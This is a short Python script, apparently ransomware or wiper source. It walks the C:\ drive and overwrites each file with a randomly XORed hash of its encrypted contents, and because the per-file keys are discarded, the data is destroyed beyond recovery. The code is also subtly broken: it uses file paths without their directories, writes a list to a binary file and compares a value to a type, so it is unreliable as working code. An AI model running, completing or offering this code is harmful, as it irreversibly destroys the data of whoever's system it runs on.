import os
import random
import string
import hashlib
from cryptography.fernet import Fernet

dirs = []

chrs = string.printable

def xor(v1):
	v2 = len(v1)
	v2 = "".join(random.sample(chrs, v2))
	new = [(ord(a) ^ ord(b)) for a,b in zip(v1, v2)]
	return new

for root,dirts,files in os.walk("C:\\"):
	for file in files:
		key = Fernet.generate_key()
		f = Fernet(key)
		try:
			file_data = open(file, "r").read()
			file_data = file_data.encode()
			file_data_crypt = f.encrypt(file_data)
			with open(file, "wb") as crypt:
				if file_data_crypt != bytes:
					try:
						file_data_crypt = bytes(file_data_crypt)
					except:
						file_data_crypt = bytes(file_data_crypt, encoding="utf8")
				file_data_crypt = str(hashlib.sha256(file_data_crypt).hexdigest())
				file_data_crypt.replace("'","")
				file_data_crypt = xor(file_data_crypt)
				crypt.write(file_data_crypt)
		except:
			print("")